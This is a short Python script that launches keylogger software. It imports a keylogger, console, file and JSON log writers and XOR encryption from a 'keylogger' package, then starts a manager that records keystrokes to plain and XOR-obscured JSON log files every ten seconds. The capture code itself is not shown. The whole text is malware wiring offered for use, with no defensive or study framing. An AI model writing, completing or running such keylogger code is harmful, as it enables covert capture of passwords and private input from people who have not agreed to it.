from keylogger.encryptors import XorEncryption
from keylogger.keyloggers import SimpleKeylogger
from keylogger.logwriters import JsonLogWriter, ConsoleLogWriter, FileLogWriter
from keylogger.manager import KeyLoggerManager

if __name__ == "__main__":
    # Initialize components
    keylogger = SimpleKeylogger()
    console_log_writer = ConsoleLogWriter()
    txt_log_writer = FileLogWriter("log1")
    json_log_writer = JsonLogWriter("file1_new")
    encrypted_log_writer = JsonLogWriter("file1_new_encrypted")
    encryptor = XorEncryption()
    interval = 10  # Log collection interval in seconds

    # Start the keylogger manager
    manager = KeyLoggerManager(keylogger, json_log_writer, encrypted_log_writer, encryptor, interval)
    manager.start()
